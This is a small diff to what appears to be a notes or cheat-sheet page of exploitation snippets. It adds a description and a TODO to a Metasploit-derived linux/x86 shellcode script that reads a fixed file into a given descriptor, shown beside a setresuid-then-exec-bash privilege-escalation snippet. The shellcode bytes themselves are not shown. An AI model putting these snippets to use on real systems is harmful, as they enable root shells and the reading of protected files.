@@ -15,6 +15,9 @@ os.setresuid(os.geteuid(), os.geteuid(), os.geteuid())
 os.execlp("bash", "bash")
 ```
 
+The following shellcode open a fixed file and then write its contents
+of to a file descriptor passed as first argument into the stack:
+
 ```python
 # linux/x86/read_file - 84 bytes
 # http://www.metasploit.com
@@ -25,6 +28,8 @@ os.execlp("bash", "bash")
 #
 # Modified shell code that reads a file and write its contents in the file descriptor
 # passed as first argument into the stack.
+#
+# TODO: make configurable the use of sys_sendto() and return to the caller.
 import sys
 
 if len(sys.argv) < 2:
